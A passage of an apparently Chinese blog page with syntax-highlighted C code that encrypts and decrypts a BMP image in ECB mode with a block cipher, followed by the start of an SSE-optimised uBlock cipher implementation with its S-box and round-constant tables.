<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> key[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x01</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x54</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x10</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> subkey[<span class=\"number\">272</span>];</span><br><span class=\"line\">    FILE *bmpFile, *encFile, *decFile;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> header[<span class=\"number\">54</span>]; <span class=\"comment\">// BMP 文件头大小为 54 字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打开朱鹮.bmp文件</span></span><br><span class=\"line\">    bmpFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮.bmp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open successfully！\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bmpFile == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open failed！\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;无法打开文件。\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取BMP文件头</span></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(header, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">54</span>, bmpFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 创建加密文件和解密文件</span></span><br><span class=\"line\">    encFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_ECB.bmp&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">    decFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_ECB_dec.bmp&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ECB加密</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buffer[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> bytesRead;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((bytesRead = <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">16</span>, bmpFile)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 执行ECB加密操作</span></span><br><span class=\"line\">        Crypt_Enc_Block_ECBbuffer, bytesRead, buffer, &amp;bytesRead, key, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将加密后的数据写入加密文件</span></span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), bytesRead, encFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 关闭加密文件</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(encFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 重新打开加密文件进行解密</span></span><br><span class=\"line\">    encFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_ECB.bmp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (encFile == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;无法打开加密文件。\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取加密文件头</span></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(header, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">54</span>, encFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ECB解密</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((bytesRead = <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">16</span>, encFile)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 执行ECB解密操作</span></span><br><span class=\"line\">        <span class=\"built_in\">Crypt_Dec_Block_ECB</span>(buffer, bytesRead, buffer, &amp;bytesRead, key, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将解密后的数据写入解密文件</span></span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), bytesRead, decFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 关闭所有文件</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(bmpFile);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(encFile);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(decFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"ublock_bmp加密代码ecb加密cpp\"><a class=\"anchor\" href=\"#ublock_bmp加密代码ecb加密cpp\">#</a> uBlock_bmp (加密代码)——ECB 加密.cpp</h2>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;memory.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;emmintrin.h&gt;</span><span class=\"comment\">//sse2 header file(include sse header file)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pmmintrin.h&gt;</span> <span class=\"comment\">//SSE3(include emmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;tmmintrin.h&gt;</span><span class=\"comment\">//SSSE3(include pmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;smmintrin.h&gt;</span><span class=\"comment\">//SSE4.1(include tmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;nmmintrin.h&gt;</span><span class=\"comment\">//SSE4.2(include smmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;intrin.h&gt;</span><span class=\"comment\">//(include immintrin.h)  </span></span></span><br><span class=\"line\"></span><br><span class=\"line\">__m128i S     = _mm_setr_epi8(<span class=\"number\">0x7</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>);</span><br><span class=\"line\">__m128i S_Inv = _mm_setr_epi8(<span class=\"number\">0xc</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">__m128i con = _mm_set1_epi8(<span class=\"number\">0x0f</span>);</span><br><span class=\"line\">__m128i A1 = _mm_setr_epi8(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>);\t</span><br><span class=\"line\">__m128i A2 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>);\t\t</span><br><span class=\"line\">__m128i A3 = _mm_setr_epi8(<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> Subkey[<span class=\"number\">17</span>][<span class=\"number\">32</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> RC[<span class=\"number\">16</span>][<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x2</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xc</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x4</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x5</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span 